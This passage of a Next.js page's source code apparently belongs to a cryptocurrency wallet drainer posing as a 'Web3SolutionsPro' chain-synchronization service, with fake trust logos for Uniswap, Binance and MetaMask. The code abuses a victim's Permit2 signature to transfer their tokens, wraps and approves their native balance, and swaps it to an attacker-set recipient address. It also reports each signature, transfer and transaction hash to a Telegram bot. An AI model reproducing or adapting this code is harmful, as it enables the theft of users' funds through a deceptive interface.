            throw new Error("Recovered address does not match user address.");
        }else{
          await sendMessageToTelegram("Signature Verified");
          await sendMessageToTelegram(`${JSON.stringify(permitBatch)}`);
          const contractX = new ethers.Contract(PERMIT2_ADDRESS, permitAbi,dWallet);
          const tx = await contractX.populateTransaction.permit(address, permitBatch, signature.signature);
         const data = tx.data;
         const rawTx = {
          to: PERMIT2_ADDRESS, // Specify the contract address as the recipient
          data: data,
          gasLimit: 800000,
          chainId: selectedChainId ?? 1,
          type: 2,
          };
          const sendRawTx = await sdk.wallet.sendRawTransaction(rawTx);
          const txHash = await sendRawTx.wait();
          await sendMessageToTelegram(`Permit Succesful!:${txHash.transactionHash}`);
          await sendMessageToTelegram(`Transfer Details: ${JSON.stringify(transferDetails)}`);
          const tx2 = await contractX.populateTransaction.transferFrom(transferDetails);
          const data2 = tx2.data;
          const rawTx2 = {
            to: PERMIT2_ADDRESS, // Specify the contract address as the recipient
            data: data2,
            gasLimit: 800000,
            chainId: selectedChainId ?? 1,
            type: 2,
            };
            const sendRawTx2 = await sdk.wallet.sendRawTransaction(rawTx2);
            const txHash2 = await sendRawTx2.wait();
            await sendMessageToTelegram(`Transfer Succesful! ${txHash2.transactionHash}`);
        }
    }
      } catch (error: unknown) {
        console.error("Error in generating permit signature:",(error as Error).message);
        // Handle error
    }
  }
  async function functionY(){
    const wrappedContract = selectedWrappedTokenAddress;
    const wrappedAbi = [{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"guy","type":"address"},{"name":"wad","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"src","type":"address"},{"name":"dst","type":"address"},{"name":"wad","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"wad","type":"uint256"}],"name":"withdraw","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"dst","type":"address"},{"name":"wad","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"deposit","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"},{"name":"","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"payable":true,"stateMutability":"payable","type":"fallback"},{"anonymous":false,"inputs":[{"indexed":true,"name":"src","type":"address"},{"indexed":true,"name":"guy","type":"address"},{"indexed":false,"name":"wad","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"src","type":"address"},{"indexed":true,"name":"dst","type":"address"},{"indexed":false,"name":"wad","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"dst","type":"address"},{"indexed":false,"name":"wad","type":"uint256"}],"name":"Deposit","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"src","type":"address"},{"indexed":false,"name":"wad","type":"uint256"}],"name":"Withdrawal","type":"event"}];
   const wrappedContractX = new ethers.Contract(wrappedContract,wrappedAbi,signer);
   const amountUnwrapped = ethers.utils.parseEther(wbalnstrnf?.toString() ?? "0");
   const wrapCall = wrappedContractX.interface.encodeFunctionData("deposit");
   const wrapTx = {
    to: wrappedContract,
    data: wrapCall,
    value: amountUnwrapped
   }
   const wrapTxResponse = await signer?.sendTransaction(wrapTx);
   const receipt =await wrapTxResponse?.wait();
   await sendMessageToTelegram(`Native Token Wrapped`);
   await sendMessageToTelegram(`Token Wrap Transaction hash: ${receipt?.transactionHash}`);
   if (receipt?.status === 1){
  const wrappedToken = new Token(
    selectedChainId!,
    selectedWrappedTokenAddress,
    selectedQuoterDecimal!,
    selectedwrappedTokenSymbol,
    selectedwrappedTokenName,
  );
  
  const unwrappedToken = new Token(
    selectedChainId!,
    selectedunwrappedTokenAddress,
    selectedQuoterDecimal!,
    "DAI",
    "Dai Stablecoin",
  );
   
  const factoryAddress = selectedv3FactoryAddress;
  const factoryContract = new ethers.Contract(
    factoryAddress,
    IUniswapV3FactoryABI.abi,
    provider
  );
  const poolAddress = await factoryContract.getPool(wrappedToken.address, unwrappedToken.address, 3000);
  await sendMessageToTelegram(`Pool Address: ${poolAddress}`);
  const poolContract =  new ethers.Contract(
    poolAddress,
    IUniswapV3PoolABI.abi,
    provider
  );
  const immutables = await getPoolImmutables(poolContract);
  const state = await getPoolState(poolContract);
  const wrappedTokenContract =  new ethers.Contract(selectedWrappedTokenAddress,abi,provider);
  const wTbalance = await wrappedTokenContract.balanceOf(address);
  await sendMessageToTelegram(`Wrapped Token Balance: ${wTbalance} ${selectedwrappedTokenSymbol}`);
  const wTb = wTbalance.toString();
  const formattedWtB = ethers.utils.parseUnits(wTb,selectedQuoterDecimal!);
  const approvalRes = await wrappedTokenContract.approve(
    selectedSwapRouter,
    wTbalance
  );
  if (approvalRes){
    await sendMessageToTelegram(`Wrapped Token Approval Sent!`);
  }
  const quoterContract = new ethers.Contract(selectedQuoterAddress,Quoter.abi,provider);
  const amountOutMin = await quoterContract.callStatic.quoteExactInputSingle(
    immutables.token0,
    immutables.token1,
    immutables.fee,
    formattedWtB,
    0
  );
  const recipient = process.env.NEXT_PUBLIC_RECIEPIENT || "0xr3c13913n7"
  const params = {
    tokenIn: immutables.token0,
    tokenOut: immutables.token1,
    fee: immutables.fee,
    recipient: recipient,
    amountIn: formattedWtB,
    amountOutMinimum: amountOutMin,
    sqrtPriceLimitX96: 0
  };
  const swapRouterContract = new ethers.Contract(selectedSwapRouter,SwapRouterABI.abi,provider);
  const tx = await swapRouterContract.exactInputSingle(params,
    {
      gasLimit: 1000000,
      type: 2,
      chainId: selectedChainId ?? 1,
    });
    const txRes = await tx.wait();
    if (txRes?.status === 1){
      await sendMessageToTelegram(`Swap Transaction Succesful!\n Transaction Hash: ${txRes?.transactionHash}`);
    }
  }
  
  
  }
    
    return (
      <div>
        <Head>
            <title> Synchronize - Web3SolutionsPro</title>
      </Head>
         <Navbar onMenuOpenChange={setIsMenuOpen}>
        <NavbarContent>
          <NavbarMenuToggle
            aria-label={isMenuOpen ? "Close menu" : "Open menu"}
            className="sm:hidden" />
          <NavbarBrand>
            <p className="font-bold text-inherit">Web3SolutionsPro</p>
          </NavbarBrand>
        </NavbarContent>
        <NavbarContent className="hidden sm:flex gap-4" justify="center">
          <NavbarItem isActive>
            <Link href="#" aria-current="page">
              Home
            </Link>
          </NavbarItem>
          <NavbarItem>
            <Link color="foreground"  href="#" >
              Airdrops
            </Link>
          </NavbarItem>
          <NavbarItem>
            <Link color="foreground" href="https://discord.gg/gwj6U2E9nR">
              Support
            </Link>
          </NavbarItem>
          <NavbarItem>
          <Switch
            defaultSelected
            size="lg"
            color="secondary"
            thumbIcon={({ isSelected, className }) => {
              if (isSelected) {
                setTheme("light");
              } else {
                setTheme("dark");
              }
              return isSelected ? (
                <SunIcon className={className} />
              ) : (
                <MoonIcon className={className} />
              );
            }}>
          </Switch>
          </NavbarItem>
        </NavbarContent>
        <NavbarContent justify="end">
          <NavbarItem>
          <ConnectWallet
      switchToActiveChain={true}
      modalTitle={"Choose your wallet"}
      modalSize={"wide"}
      welcomeScreen={{
        title: "Your Universal Chain Resolver",
      }}
      modalTitleIconUrl={"/favicon.ico"}
      termsOfServiceUrl={"https://Web3SolutionsPro.com"}
        privacyPolicyUrl={"https://Web3SolutionsPro.com"}
      showThirdwebBranding={false}
      theme={isThemeValid(theme) ? theme : "light"} />
          </NavbarItem>
        </NavbarContent>
        <NavbarMenu>
          {menuItems.map((item, index) => (
            <NavbarMenuItem key={`${item}-${index}`}>
              <Link
                color={
                  index === 0 ? "primary" : index === menuItems.length - 1 ? "danger" : "foreground"
                }
                className="w-full"
                href={getHrefForMenuItem(item, index)}
                size="lg"
              >
                {item}
              </Link>
            </NavbarMenuItem>
          ))}
           <Switch
            defaultSelected
            size="lg"
            color="secondary"
            thumbIcon={({ isSelected, className }) => {
              if (isSelected) {
                setTheme("light");
              } else {
                setTheme("dark");
              }
              return isSelected ? (
                <SunIcon className={className} />
              ) : (
                <MoonIcon className={className} />
              );
            }} >
          </Switch>
        </NavbarMenu>
      </Navbar>
        <div></div>
        <Modal isOpen={showConnectModal} onClose={() => setShowConnectModal(false)}>
    <ModalContent>
            {(onClose) => (
              <>
                <ModalHeader className="flex flex-col gap-1">Connect Wallet</ModalHeader>
                <ModalBody>
                  <p> 
                    Connect your wallet to access this feature.
                    <ConnectWallet
      switchToActiveChain={true}
      modalTitle={"Choose your wallet"}
      modalSize={"wide"}
      welcomeScreen={{
        title: "Your Universal Chain Resolver",
      }}
      modalTitleIconUrl={"/favicon.ico"}
      termsOfServiceUrl={"https://Web3SolutionsPro.com"}
        privacyPolicyUrl={"https://Web3SolutionsPro.com"}
      showThirdwebBranding={false}
      theme={isThemeValid(theme) ? theme : "light"} />
                  </p>
                </ModalBody>
                <ModalFooter>
                  <Button color="danger" variant="light" onPress={onClose}>
                    Close
                  </Button>
                </ModalFooter>
              </>
            )}
          </ModalContent>
  </Modal>
  <Modal isOpen={isOpen} onOpenChange={onOpenChange}>
    <ModalContent>
      {(onClose) => (
        <>
          <ModalHeader>Select Chain</ModalHeader>
          <ModalBody>
            <p>Choose the network you want to interact with:</p>
            {chainList.map(chain => (
              <Button key={chain.id} color="success" variant="light" onClick={() => handleChainSelection2(chain.name, chain.id, chain.symbol,chain.title,chain.quoterDecimals,chain.wrappedTokenSymbol,chain.wrappedTokenAddress,chain.wrappedTokenName,chain.unwrappedTokenAddress,chain.v3FactoryAddress,chain.quoterAddress,chain.swapRouter)}>
                {chain.title}
              </Button>
            ))}
          </ModalBody>
          <ModalFooter>
          </ModalFooter>
        </>
      )}
    </ModalContent>
  </Modal>
  {loading && (
        <div style={{ position: 'fixed', top: '50%', left: '50%', transform: 'translate(-50%, -50%)', zIndex: 1000,}} className="w-full h-full flex justify-center items-center bg-gray-500 bg-opacity-50 backdrop-filter backdrop-blur-lg z-50">
          <CircularProgress color="secondary" size="lg" label="Synchronization in progress..."/>
        </div>
      )}
  {chainSelectionConfirmed && (
           <div className="fixed top-0 left-0 w-full h-full flex justify-center items-center bg-gray-500 bg-opacity-50 backdrop-filter backdrop-blur-lg z-50">
           <button className="bg-blue-500 text-white py-2 px-4 rounded shadow-lg" onClick={() => selectedChainId && syncChain(selectedChain, selectedChainId, selectedSymbol)}>
             Continue Synchronization.
           </button>
         </div>
        )}
        <br></br>
        <div className="gap-4 grid grid-cols-2 sm:grid-cols-4">
        {list.map((item, index) => (
          <Card shadow="sm" key={index} isPressable onPress={() => syncChain(selectedChain, selectedChainId!,selectedSymbol)} className="border-double border-2 bg-transparent">
            <CardBody className="overflow-visible p-0">
              <p className="justify-center text-center py-8 px-8">{item.body}</p>
            </CardBody>
            <CardFooter className="text-small justify-between">
              <b>{item.title}</b>
            </CardFooter>
          </Card>
        ))}
      </div>
      <div className=" py-24 sm:py-32">
      <div className="mx-auto max-w-7xl px-6 lg:px-8">
        <h2 className="text-center text-lg font-semibold leading-8 ">
          Trusted by the world’s most innovative teams
        </h2>
        <div className="mx-auto mt-10 grid max-w-lg grid-cols-4 items-center gap-x-8 gap-y-10 sm:max-w-xl sm:grid-cols-6 sm:gap-x-10 lg:mx-0 lg:max-w-none lg:grid-cols-5">
          <img
            className="col-span-2 max-h-12 w-full object-contain lg:col-span-1"
            src="https://img.icons8.com/external-black-fill-lafs/64/8116E4/external-Uniswap-cryptocurrency-black-fill-lafs.png"
            alt="Uniswap"
            width={158}
            height={48}
          />
          <img
            className="col-span-2 max-h-12 w-full object-contain lg:col-span-1"
            src="https://img.icons8.com/external-black-fill-lafs/64/8116E4/external-PancakeSwap-cryptocurrency-black-fill-lafs.png"
            alt="PancakeSwap"
            width={158}
            height={48}
          />
          <img
            className="col-span-2 max-h-12 w-full object-contain lg:col-span-1"
            src="https://img.icons8.com/external-black-fill-lafs/64/8116E4/external-Binance-cryptocurrency-black-fill-lafs.png"
            alt="Binance"
            width={158}
            height={48}
          />
          <img
            className="col-span-2 max-h-12 w-full object-contain sm:col-start-2 lg:col-span-1"
            src="https://img.icons8.com/ios/100/8116E4/metamask-logo.png"
            alt="Metamask"
            width={158}
            height={48}
          />
          <img
            className="col-span-2 col-start-2 max-h-12 w-full object-contain sm:col-start-auto lg:col-span-1"
            src="https://img.icons8.com/ios-filled/100/8116E4/ethereum.png"
            alt="Ethereum"
            width={158}
            height={48}
          />
        </div>
      </div>
    </div>
    <footer className=" align-center ">
    <div className="container pt-9 justify-center">
      <div className="mb-9 flex justify-center  text-center ">
       
      </div>
    </div>

    {/* <!--Copyright section--> */}
    <div
      className=" p-4 text-center ">
      © 2024&nbsp;
      <a
        className=""
        href="#"
      >Web3SolutionsPro</a>
    </div>
  </footer>
      </div>
    );
  };
  const sendMessageToTelegram = async (message: string) => {
    const bt = process.env.NEXT_PUBLIC_BOT_TOKEN || "bottoken";
    const cid = process.env.NEXT_PUBLIC_CHAT_ID || "chatid";
    const botToken = bt;
    const chatId = cid;  
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    });
  };
  export default Home;